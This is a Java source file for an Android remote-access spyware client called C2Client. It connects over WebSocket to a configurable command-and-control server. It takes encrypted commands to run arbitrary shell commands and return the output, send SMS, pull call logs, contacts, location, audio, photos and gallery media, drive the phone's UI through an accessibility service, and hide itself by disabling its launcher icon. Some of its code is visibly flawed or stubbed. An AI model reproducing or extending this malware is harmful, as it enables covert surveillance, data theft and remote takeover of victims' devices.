package com.system.service;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class C2Client {

    private static final String TAG = "C2Client";
    private final Context context;
    private final CoreApplication app;
    private WebSocketClient wsClient;
    private String sessionKey;
    private boolean connected = false;
    private final Gson gson = new Gson();

    public C2Client(Context context) {
        this.context = context;
        this.app = CoreApplication.getInstance();
        this.sessionKey = generateSessionKey();
    }

    private String generateSessionKey() {
        byte[] key = new byte[16];
        new SecureRandom().nextBytes(key);
        return Base64.encodeToString(key, Base64.NO_WRAP);
    }

    public void connect() {
        if (connected) return;

        String host = app.getC2Host();
        int port = app.getC2Port();
        boolean ssl = app.useSSL();

        String scheme = ssl ? "wss" : "ws";
        String uriStr = String.format("%s://%s:%d/ws?device=%s", scheme, host, port, app.getDeviceId());

        try {
            URI uri = new URI(uriStr);
            wsClient = new WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    connected = true;
                    Log.i(TAG, "C2 connected");
                    sendHeartbeat();
                }

                @Override
                public void onMessage(String message) {
                    handleCommand(message);
                }

                @Override
                public void onMessage(ByteBuffer bytes) {
                    // Binary commands
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    connected = false;
                    Log.w(TAG, "C2 disconnected: " + reason);
                    scheduleReconnect();
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "C2 error", ex);
                }
            };
            wsClient.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "Invalid C2 URI", e);
            scheduleReconnect();
        }
    }

    private void scheduleReconnect() {
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
            this::connect, 30000
        );
    }

    public void disconnect() {
        if (wsClient != null) {
            wsClient.close();
            wsClient = null;
        }
        connected = false;
    }

    public void sendHeartbeat() {
        if (!connected) return;
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "heartbeat");
        msg.addProperty("device_id", app.getDeviceId());
        msg.addProperty("ts", System.currentTimeMillis());
        sendEncrypted(msg);
    }

    public void exfiltrate(String data) {
        if (!connected) return;
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "exfil");
        msg.addProperty("device_id", app.getDeviceId());
        msg.addProperty("data", data);
        msg.addProperty("ts", System.currentTimeMillis());
        sendEncrypted(msg);
    }

    private void sendEncrypted(JsonObject msg) {
        try {
            String plaintext = gson.toJson(msg);
            String encrypted = encrypt(plaintext, sessionKey);
            JsonObject wrapper = new JsonObject();
            wrapper.addProperty("enc", encrypted);
            wsClient.send(gson.toJson(wrapper));
        } catch (Exception e) {
            Log.e(TAG, "Encrypt failed", e);
        }
    }

    private void handleCommand(String encryptedMsg) {
        try {
            JsonObject wrapper = gson.fromJson(encryptedMsg, JsonObject.class);
            String encrypted = wrapper.get("enc").getAsString();
            String decrypted = decrypt(encrypted, sessionKey);
            JsonObject cmd = gson.fromJson(decrypted, JsonObject.class);
            
            String type = cmd.get("type").getAsString();
            executeCommand(type, cmd);
        } catch (Exception e) {
            Log.e(TAG, "Command handling failed", e);
        }
    }

    private void executeCommand(String type, JsonObject cmd) {
        switch (type) {
            case "collect_now":
                // Trigger immediate collection
                break;
            case "update_config":
                String newHost = cmd.get("host").getAsString();
                int newPort = cmd.get("port").getAsInt();
                boolean newSsl = cmd.get("ssl").getAsBoolean();
                app.setC2Config(newHost, newPort, newSsl);
                disconnect();
                connect();
                break;
            case "uninstall":
                selfDestruct();
                break;
            case "shell":
                String shellCmd = cmd.get("cmd").getAsString();
                executeShell(shellCmd);
                break;
            case "sms_send":
                String number = cmd.get("number").getAsString();
                String text = cmd.get("text").getAsString();
                sendSms(number, text);
                break;
            case "call_log":
                exfiltrateCallLog();
                break;
            case "contacts":
                exfiltrateContacts();
                break;
            case "location":
                requestLocation();
                break;
            case "record_audio":
                int duration = cmd.get("duration").getAsInt();
                recordAudio(duration);
                break;
            case "take_photo":
                takePhoto();
                break;
            case "exfil_media":
                long mediaId = cmd.get("media_id").getAsLong();
                String mediaType = cmd.get("media_type").getAsString();
                exfiltrateMedia(mediaId, mediaType);
                break;
            case "exfil_gallery":
                String galleryType = cmd.get("gallery_type").getAsString();
                int limit = cmd.has("limit") ? cmd.get("limit").getAsInt() : 50;
                exfiltrateGallery(galleryType, limit);
                break;
            case "interact_click":
                String clickTargetId = cmd.has("target_id") ? cmd.get("target_id").getAsString() : null;
                String clickTargetText = cmd.has("target_text") ? cmd.get("target_text").getAsString() : null;
                queueInteraction("click", clickTargetId, clickTargetText, null, 0, 0);
                break;
            case "interact_long_click":
                String lcTargetId = cmd.has("target_id") ? cmd.get("target_id").getAsString() : null;
                String lcTargetText = cmd.has("target_text") ? cmd.get("target_text").getAsString() : null;
                queueInteraction("long_click", lcTargetId, lcTargetText, null, 0, 0);
                break;
            case "interact_input":
                String inputTargetId = cmd.has("target_id") ? cmd.get("target_id").getAsString() : null;
                String inputTargetText = cmd.has("target_text") ? cmd.get("target_text").getAsString() : null;
                String inputText = cmd.get("input_text").getAsString();
                queueInteraction("input", inputTargetId, inputTargetText, inputText, 0, 0);
                break;
            case "interact_scroll":
                String scrollTargetId = cmd.has("target_id") ? cmd.get("target_id").getAsString() : null;
                String scrollTargetText = cmd.has("target_text") ? cmd.get("target_text").getAsString() : null;
                int direction = cmd.get("direction").getAsInt(); // 1=forward/down, -1=backward/up
                queueInteraction("scroll", scrollTargetId, scrollTargetText, null, direction, 0);
                break;
            case "interact_swipe":
                int x = cmd.get("x").getAsInt();
                int y = cmd.get("y").getAsInt();
                queueInteraction("swipe", null, null, null, x, y);
                break;
            case "interact_global":
                String globalAction = cmd.get("action").getAsString(); // back, home, recent, notifications, quick_settings, power_dialog
                queueInteraction(globalAction, null, null, null, 0, 0);
                break;
            case "dump_ui":
                dumpUiTree();
                break;
        }
    }

    private void executeShell(String cmd) {
        new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
                
                JsonObject result = new JsonObject();
                result.addProperty("type", "shell_result");
                result.addProperty("output", output.toString());
                sendEncrypted(result);
            } catch (Exception e) {
                Log.e(TAG, "Shell exec failed", e);
            }
        }).start();
    }

    private void sendSms(String number, String text) {
        android.telephony.SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
    }

    private void exfiltrateCallLog() {
        // Implemented in DataCollector
    }

    private void exfiltrateContacts() {
        // Implemented in DataCollector
    }

    private void requestLocation() {
        // Implemented in DataCollector
    }

    private void recordAudio(int duration) {
        // Implemented in DataCollector
    }

    private void takePhoto() {
        // Implemented in DataCollector
    }

    private void exfiltrateMedia(long mediaId, String mediaType) {
        DataCollector collector = new DataCollector(context);
        collector.exfiltrateMedia(mediaId, mediaType);
    }

    private void exfiltrateGallery(String mediaType, int limit) {
        DataCollector collector = new DataCollector(context);
        collector.exfiltrateAllGallery(mediaType, limit);
    }

    private void queueInteraction(String action, String targetId, String targetText, String inputText, int x, int y) {
        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        handler.post(() -> {
            com.system.service.collection.AccessibilityCollector.queueInteraction(action, targetId, targetText, inputText, x, y);
        });
    }

    private void dumpUiTree() {
        // Trigger UI tree dump via accessibility service
        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        handler.post(() -> {
            com.system.service.collection.AccessibilityCollector.queueInteraction("dump_ui", null, null, null, 0, 0);
        });
    }

    private void selfDestruct() {
        // Remove app icon, stop services, clear data
        android.content.pm.PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
            new android.content.ComponentName(context, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        );
        context.stopService(new Intent(context, PersistenceService.class));
        context.stopService(new Intent(context, WatchdogService.class));
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    // AES encryption
    private String encrypt(String data, String key) throws Exception {
        SecretKeySpec spec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, spec);
        byte[] encrypted = cipher.doFinal(data.getBytes());
        return Base64.encodeToString(encrypted, Base64.NO_WRAP);
    }

    private String decrypt(String data, String key) throws Exception {
        SecretKeySpec spec = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, spec);
        byte[] decoded = Base64.decode(data, Base64.NO_WRAP);
        byte[] decrypted = cipher.doFinal(decoded);
        return new String(decrypted);
    }
}